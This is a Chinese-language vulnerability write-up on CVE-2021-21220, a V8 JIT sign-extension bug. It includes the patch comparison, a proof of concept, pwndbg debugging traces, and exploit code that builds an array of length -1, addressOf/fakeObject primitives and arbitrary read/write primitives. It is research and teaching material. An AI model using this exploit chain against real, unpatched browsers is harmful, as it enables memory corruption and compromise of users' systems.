/root/v8/v8/out/x64.release/d8</span><br><span class="line">...</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000</span><br><span class="line"> RCX  0xdf20013f500 ◂— push   rbp</span><br><span class="line"> RDX  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x7fffaaa8fd00 —▸ 0xdf208042895 ◂— 0x80428</span><br><span class="line"> R8   0xdf20821289d ◂— 0x7500000006082442</span><br><span class="line"> R9   0x145</span><br><span class="line"> R10  0xc00000000</span><br><span class="line"> R11  0xfffffffffffffffa</span><br><span class="line"> R12  0x55fe3c799170 ◂— 0x0</span><br><span class="line"> R13  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000</span><br><span class="line"> R14  0x55fe3ba73160 (v8::internal::kIntrinsicFunctions) ◂— 0x0</span><br><span class="line"> R15  0x55fe3c7975e0 ◂— 0x1baddead0baddeaf</span><br><span class="line"> RBP  0x7fffaaa8fc20 —▸ 0x7fffaaa8fc50 —▸ 0x7fffaaa8fc78 —▸ 0x7fffaaa8fc98 —▸ 0x7fffaaa8fd30 ◂— ...</span><br><span class="line"> RSP  0x7fffaaa8fc20 —▸ 0x7fffaaa8fc50 —▸ 0x7fffaaa8fc78 —▸ 0x7fffaaa8fc98 —▸ 0x7fffaaa8fd30 ◂— ...</span><br><span class="line"> RIP  0x55fe3b8ca445 (v8::base::OS::DebugBreak()+5) ◂— pop    rbp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现代CPU中的分支预测器非常好，并且代码大小（尤其是执行路径长度）对性能的影响更大。</p>
<p>具体的实现可以参考</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 / src / common / ptr-compr.h</span><br><span class="line">v8 / src / common / ptr-compr-inl.h</span><br></pre></td></tr></table></figure>



<h3 id="3、补丁对比"><a href="#3、补丁对比" class="headerlink" title="3、补丁对比"></a>3、补丁对比</h3><p>根据issue里面的补丁比较链接</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2820971/3/src/compiler/backend/x64/instruction-selector-x64.cc#1381" >https://chromium-review.googlesource.com/c/v8/v8/+/2820971/3/src/compiler/backend/x64/instruction-selector-x64.cc#1381<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="/2021/04/30/CVE-2021-21220/image-20210422093925521.png" alt="image-20210422093925521"></p>
<p>可以看出该bugfix的函数为ChangeInt32ToInt64，将32位整形数向64位进行拓展，修复之前的代码为判断传入的32位整型数是否为有符号从而选择movsx和mov，而修复后强制使用movsx进行有符号拓展。</p>
<h3 id="4、漏洞分析"><a href="#4、漏洞分析" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><h4 id="（1）POC分析"><a href="#（1）POC分析" class="headerlink" title="（1）POC分析"></a>（1）POC分析</h4><p>POC与执行结果如下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">print = <span class="built_in">console</span>.log;</span><br><span class="line"><span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">2</span>**<span class="number">31</span>]);		<span class="comment">// 定义了一个只有一个元素的Uint32类型的数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;    			<span class="comment">// 漏洞触发</span></span><br><span class="line">&#125;										 </span><br><span class="line">print(foo());<span class="comment">//-2147483647					// 解释器工作</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)					<span class="comment">//代码价值提升，交由JIT处理</span></span><br><span class="line">    foo();</span><br><span class="line">print(foo());<span class="comment">//2147483649					//JIT处理后的结果</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release<span class="comment"># ./d8 test_jscode/d8_poc.js</span></span><br><span class="line">-2147483647</span><br><span class="line">2147483649</span><br></pre></td></tr></table></figure>

<p>我们对POC进行分析，首先分析arr数组元素</p>
<p>arr[0]是unsigned int32 = <code>2**31</code> = 2147483648 = 0x8000 0000</p>
<p> arr[0] ^ 0会转成signed int32 = 2**31^0 = 0x8000 0000 = -2147483648，至于为什么无符号操作数与0异或变为有符号，参考[4]。</p>
<p><img src="/2021/04/30/CVE-2021-21220/image-20210422212700225.png" alt="image-20210422212700225"></p>
<p> (arr[0] ^ 0) + 1会转成signed int64，按理说是先符号拓展，得到0xFFFF FFFF 8000 0000，然后再加一，得到0xFFFF FFFF 8000 0001 = -2147483647</p>
<p>之后会解释器执行打印函数返回值以及JIT编译执行打印函数返回值</p>
<p>可以看到，在经过JIT优化前与优化后，foo的返回值是不相同的；这个从上面的补丁分析中我们也已经了解了，JIT在处理代码的时候将本该有符号拓展的数进行了无符号拓展。</p>
<h4 id="（2）执行流分析"><a href="#（2）执行流分析" class="headerlink" title="（2）执行流分析"></a>（2）执行流分析</h4><h5 id="SimplifiedLowering"><a href="#SimplifiedLowering" class="headerlink" title="SimplifiedLowering"></a>SimplifiedLowering</h5><p>在该阶段，通过#45 LoadTypedElement可以知道arr[0]的类型 Unsigned32，之后#31 Word32Xor处理之后类型为Signed32，之后+1需要做int32到int64的转换，调用了#58 ChangeInt32ToInt64，并将返回值与#59 Int64Constant[1]作为参数交由#50 ChangeInt32ToInt64处理。这段处理逻辑是没有问题的。</p>
<p><img src="/2021/04/30/CVE-2021-21220/image-20210422210705763.png" alt="image-20210422210705763"></p>
<h5 id="MachineOperatorOptimization"><a href="#MachineOperatorOptimization" class="headerlink" title="MachineOperatorOptimization"></a>MachineOperatorOptimization</h5><p>而在该阶段，将arr[0] ^ 0通过JIT在#81 Load处获取运算所得的结果，此时该结果的类型为kRepWord32[kTypeUint32]，为<strong>无符号</strong>，此时仍然经过#58 ChangeInt32ToInt64进行处理。</p>
<p><img src="/2021/04/30/CVE-2021-21220/image-20210422214123570.png" alt="image-20210422214123570"></p>
<p>而ChangeInt32ToInt64的处理如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">case</span> MachineRepresentation::kWord32:</span><br><span class="line">        opcode = load_rep.<span class="built_in">IsSigned</span>() ? kX64Movsxlq : kX64Movl;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>由于操作数时无符号，所以这里进行了无符号拓展，此时(arr[0] ^ 0) + 1的值为0 x 0000 0000 8000 0000 + 1，为2147483649。</p>
<h4 id="（3）动态验证"><a href="#（3）动态验证" class="headerlink" title="（3）动态验证"></a>（3）动态验证</h4><p>通过gdb验证下我们上述分析的过程，动态分析的思路为通过%DebugPrint输出得到arr元素的内存地址，然后下内存读断点，追踪到JIT处理foo函数的位置。</p>
<p>定位流程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release# gdb d8</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test_jscode/d8_poc.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">...</span><br><span class="line">-2147483647</span><br><span class="line">DebugPrint: 0x4e60808851d: [JSTypedArray]</span><br><span class="line"> - map: 0x04e608243109 &lt;Map(UINT32ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x04e608209815 &lt;Object map = 0x4e608243131&gt;</span><br><span class="line"> - elements: 0x04e608088511 &lt;ByteArray[4]&gt; [UINT32ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer: 0x04e6080884d9 &lt;ArrayBuffer map = 0x4e6082431f9&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 4</span><br><span class="line"> - length: 1</span><br><span class="line"> - data_ptr: 0x4e608088518</span><br><span class="line">   - base_pointer: 0x8088511</span><br><span class="line">   - external_pointer: 0x4e600000007</span><br><span class="line"> - properties: 0x04e60804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"> - elements: 0x04e608088511 &lt;ByteArray[4]&gt; &#123;</span><br><span class="line">           0: 2147483648</span><br><span class="line"> &#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">0x4e608243109: [Map]</span><br><span class="line"> - type: JS_TYPED_ARRAY_TYPE</span><br><span class="line"> - instance size: 68</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: UINT32ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x04e6080423b5 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x04e608182405 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x04e6080421c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: 0x04e608209815 &lt;Object map = 0x4e608243131&gt;</span><br><span class="line"> - constructor: 0x04e60820979d &lt;JSFunction Uint32Array (sfi = 0x4e608189721)&gt;</span><br><span class="line"> - dependent code: 0x04e608212aed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/wx 0x04e608088511-1+8</span><br><span class="line">0x4e608088518:  0x80000000</span><br><span class="line">pwndbg&gt; rwatch *(int*)0x04e608088518</span><br><span class="line">Hardware read watchpoint 1: *(int*)0x04e60808851</span><br></pre></td></tr></table></figure>

<p>验证静态分析结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">Thread 1 &quot;d8&quot; hit Hardware read watchpoint 1: *(int*)0x04e608088518</span><br><span class="line">Value = -2147483648</span><br><span class="line">0x000004e6001c4330 in ?? ()</span><br><span class="line">ERROR: Could not find ELF base!</span><br><span class="line">LEGND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line">*RBX  0x4e608212ac9 ◂— 0x8080423b508042a</span><br><span class="line">*RCX  0x80000000</span><br><span class="line">...</span><br><span class="line">──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4e6001c4330    add    rcx, 1</span><br><span class="line">   0x4e6001c4334    mov    edi, ecx</span><br><span class="line">   0x4e6001c4336    movsxd r8, ecx</span><br><span class="line">   0x4e6001c4339    cmp    r8, rcx</span><br><span class="line">   0x4e6001c433c    jne    0x4e6001c4394 &lt;0x4e6001c4394&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x4e6001c4394    movabs rdi, 0x5626663c8c48</span><br><span class="line">   0x4e6001c439e    mov    r8, qword ptr [rdi]</span><br><span class="line">   0x4e6001c43a1    lea    r9, [r8 + 0xc]</span><br><span class="line">   0x4e6001c43a5    mov    qword ptr [rbp - 0x20], rcx</span><br><span class="line">   0x4e6001c43a9    movabs r11, 0x5626663c8c50</span><br><span class="line">   0x4e6001c43b3    cmp    qword ptr [r11], r9</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; si</span><br><span class="line">0x000004e6001c4334 in ?? ()</span><br><span class="line">ERROR: Could not find ELF base!</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x4e608212ac9 ◂— 0x8080423b508042a</span><br><span class="line">*RCX  0x80000001</span><br><span class="line">...</span><br><span class="line">──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────</span><br><span class="line">   0x4e6001c4330    add    rcx, 1</span><br><span class="line"> ► 0x4e6001c4334    mov    edi, ecx</span><br><span class="line">   0x4e6001c4336    movsxd r8, ecx</span><br><span class="line">   0x4e6001c4339    cmp    r8, rcx</span><br><span class="line">   0x4e6001c433c    jne    0x4e6001c4394 &lt;0x4e6001c4394&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x4e6001c4394    movabs rdi, 0x5626663c8c48</span><br><span class="line">   0x4e6001c439e    mov    r8, qword ptr [rdi]</span><br><span class="line">   0x4e6001c43a1    lea    r9, [r8 + 0xc]</span><br><span class="line">   0x4e6001c43a5    mov    qword ptr [rbp - 0x20], rcx</span><br><span class="line">   0x4e6001c43a9    movabs r11, 0x5626663c8c50</span><br><span class="line">   0x4e6001c43b3    cmp    qword ptr [r11], r9</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/5i 0x4e6001c432b</span><br><span class="line">   0x4e6001c432b:       add    rcx,r8</span><br><span class="line">   0x4e6001c432e:       mov    ecx,DWORD PTR [rcx]</span><br><span class="line">   0x4e6001c4330:       add    rcx,0x1</span><br><span class="line">=&gt; 0x4e6001c4334:       mov    edi,ecx</span><br><span class="line">   0x4e6001c4336:       movsxd r8,ecx</span><br></pre></td></tr></table></figure>

<p>观察到在执行完<strong>0x4e6001c432e</strong>处指令后，RCX 的值为 0x80000000，并没有进行有符号拓展，而执行完<strong>0x4e6001c4330</strong>后，RCX 的值为 0x80000001，验证了我们得到的结果。</p>
<h4 id="（4）EXP构造"><a href="#（4）EXP构造" class="headerlink" title="（4）EXP构造"></a>（4）EXP构造</h4><h5 id="（1）构造超长数组"><a href="#（1）构造超长数组" class="headerlink" title="（1）构造超长数组"></a>（1）构造超长数组</h5><p>从ChangeInt32ToInt64到将数组长度设置为-1，需要用到一种针对于JIT常用的利用技术：typer bug[6]，简单的理解就是在JavaScript函数的前几次调用期间，解释器记录各种操作的类型信息，例如参数访问和属性加载。如果以后选择该函数进行JIT编译，则V8的最新编译器TurboFan会假定在所有后续调用中都将使用观察到的类型，并使用从解释器中得出的规则集将类型信息传播到JIT。</p>
<p>我们将poc构造如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">	x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">	x = <span class="built_in">Math</span>.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;		</span><br><span class="line">	x = <span class="built_in">Math</span>.max(x, <span class="number">0</span>);			<span class="comment">// predicted = 0; actual = 2</span></span><br><span class="line">	x -= <span class="number">1</span>;					   <span class="comment">// predicted = -1; actual = 1</span></span><br><span class="line">	<span class="keyword">if</span>(x==-<span class="number">1</span>) x = <span class="number">0</span>;			<span class="comment">// predicted = 0; actual = 1			</span></span><br><span class="line">	<span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(x);		<span class="comment">// predicted = 0; actual = 1</span></span><br><span class="line">	arr.shift();				<span class="comment">// predicted = 0; actual = -1，这里是比较难以理解的部分，之前解释器在处理shift的时候判断x的值为0，正常执行，所以在JIT阶段优化掉了边界检查；而在JIT阶段x==1，此时JIT仍将x的值当作0，由于x实际为1，所以shift将对数组长度做减一操作，再由于此时JIT将x的值当作0，所以最终数组的长度为0-1 == -1，这样构造出了超长的数组，可以进行很高的相对地址读写权限。</span></span><br><span class="line">	<span class="keyword">var</span> cor = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">	<span class="keyword">return</span> [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> x = foo(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x30000</span>;++i)</span><br><span class="line">    foo(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = foo(<span class="literal">false</span>);</span><br><span class="line">print(x[<span class="number">0</span>].length);</span><br><span class="line">%DebugPrint(x[<span class="number">0</span>]);                    </span><br><span class="line">%SystemBreak();                                </span><br></pre></td></tr></table></figure>

<p>在LoadElimination阶段，可以看到将-1存储到#185 StoreElement，并传递给#184 StoreField 之后继续传递到#192 EffedtPhi，而调用#190 ArrayShift也会经由#192 EffectPhi处理得到的参数。</p>
<p><img src="/2021/04/30/CVE-2021-21220/image-20210428101114540.png" alt="image-20210428101114540"></p>
<p>调试验证结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">-1</span><br><span class="line">DebugPrint: 0x351f0833dd31: [JSArray]</span><br><span class="line"> - map: 0x351f082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x351f0820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x351f0833dd25 &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS]				;可见构建了超长数组：FixedArray[67244566]</span><br><span class="line"> - length: -1</span><br><span class="line"> - properties: 0x351f0804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x351f080446c1: [String] in ReadOnlySpace: #length: 0x351f0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x351f0833dd25 &lt;FixedArray[67244566]&gt; &#123;</span><br><span class="line">           0: 0x351f0804242d &lt;the_hole&gt;</span><br><span class="line">           1: 0x351f082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line">           2: 0x351f0804222d &lt;FixedArray[0]&gt;</span><br><span class="line">           3: 0x351f0833dd25 &lt;FixedArray[67244566]&gt;</span><br><span class="line">           4: -1</span><br><span class="line">           5: 0x351f08042a95 &lt;Map&gt;</span><br><span class="line">           6: 3</span><br><span class="line">           7: -858993459</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/10wx 0x351f0833dd24</span><br><span class="line">0x351f0833dd24: 0x08042205      0x0804242d      0x0804242d      0x082439c9</span><br><span class="line">0x351f0833dd34: 0x0804222d      0x0833dd25      0xfffffffe      0x08042a95			;0xfffffffe为-1，</span><br><span class="line">0x351f0833dd44: 0x00000006      0x9999999</span><br></pre></td></tr></table></figure>

<h5 id="（2）addressOf和fakeObject实现"><a href="#（2）addressOf和fakeObject实现" class="headerlink" title="（2）addressOf和fakeObject实现"></a>（2）addressOf和fakeObject实现</h5><p>之后确定arr和cor的偏移，方便通过对arr的相对地址读写进行addressOf和fakeObject的实现。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = x[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> cor = x[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">const</span> idx = <span class="number">6</span>;</span><br><span class="line"><span class="comment">//arr[idx+11] = 0x4242;  </span></span><br><span class="line">arr[idx+<span class="number">10</span>] = <span class="number">0x2333</span>;                           <span class="comment">//arr[idx+10]位置处存放cor的length属性，在这里可以将cor的长度扩展造成相对地址读写。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    arr[idx+<span class="number">1</span>] = k;</span><br><span class="line">    <span class="keyword">return</span> f2big(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffffn</span>;         <span class="comment">//由于只有Array对象有shift方法，而Array对象的每个元素为四字节，我们只能泄露低四字节的地址（不排除有一些我不清楚的方法可以泄露八字节）,而这里的八字节因为前四字节已经被位运算清零了。实际上这里需要的也仅仅是四字节读写的能力，引擎会自动填充前面的基址。</span></span><br><span class="line">&#125;<span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">    cor[<span class="number">0</span>] = big2f(k);</span><br><span class="line">    <span class="keyword">return</span> arr[idx+<span class="number">1</span>];                          <span class="comment">//返回的也只是低四字节</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> test = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">test_addr = addressOf(test);</span><br><span class="line"><span class="built_in">console</span>.log(test_addr);</span><br><span class="line">%DebugPrint(test);			</span><br><span class="line">%SystemBreak();	</span><br></pre></td></tr></table></figure>

<p>简单介绍下上述代码，arr[idx+10]为cor的length属性，可以直接修改该值为大于原长度的值，这样cor数组也可以进行越界读写了，cor与arr的区别在于cor的相对读写可以操作八个字节。然后是addressOf与fakeObject原语的构造，在这里，由于arr和cor可以通过不同的索引值访问相同的空间，这样通过不同类型的数组读取出来的值的类型是不一样的（元素靠数组的map来确定类型），这样很容易就可以实现类型混淆。前面确定了cor与arr的内存相对偏移，便可以进行addressOf和fakeObject的实现。</p>
<p>调试来验证结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">000000000811d8b9</span><br><span class="line">DebugPrint: 0x19b00811d8b9: [JSArray]</span><br><span class="line"> - map: 0x19b0082439f1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x19b00820b959 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x19b00811d8d1 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x19b00804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x19b0080446c1: [String] in ReadOnlySpace: #length: 0x19b00818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x19b00811d8d1 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h5 id="（3）任意读写原语实现"><a href="#（3）任意读写原语实现" class="headerlink" title="（3）任意读写原语实现"></a>（3）任意读写原语实现</h5><p>相关代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var float_array_map = f2big(cor[3]);              </span><br><span class="line">var arr2 = [big2f(float_array_map), 1.2, 2.3, 3.4];         //创建伪造对象的数组</span><br><span class="line">var fake = fakeObject(addressOf(arr2) + 0x20n);             //通过fakeObject伪造对象</span><br><span class="line">function arbread(addr) &#123;</span><br><span class="line">    if (addr % 2n == 0) </span><br><span class="line">        addr += 1n;</span><br><span class="line">    arr2[1] = big2f((2n &lt;&lt; 32n) + addr - 8n);               //创建伪造对象的数组，这里arr2[0] == fake_map, arr2[1] == arr2_length+elements_addr；2n &lt;&lt; 32n代表arr2的长度。大于等于2即可。</span><br><span class="line">    return (fake[0]);                                       //将addr2的内存构造为：前四字节为伪造的对象的长度，后四字节为要读取信息的地址。，fake[0]相当于那个修改任意地址的指针。</span><br><span class="line">&#125;function arbwrite(addr, val) &#123;</span><br><span class="line">    if (addr % 2n == 0) </span><br><span class="line">        addr += 1n;</span><br><span class="line">    arr2[1] = big2f((2n &lt;&lt; 32n) + addr - 8n);</span><br><span class="line">    fake[0] = big2f(BigInt(val));                           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体相关的点都已经在代码注释中标注出来了，唯一需要注意的可能就是arr2[1]和fake[0]的换算关系如何得出，这个可以通过下面的内存状态尝试理解并编写相应的原语。</p>
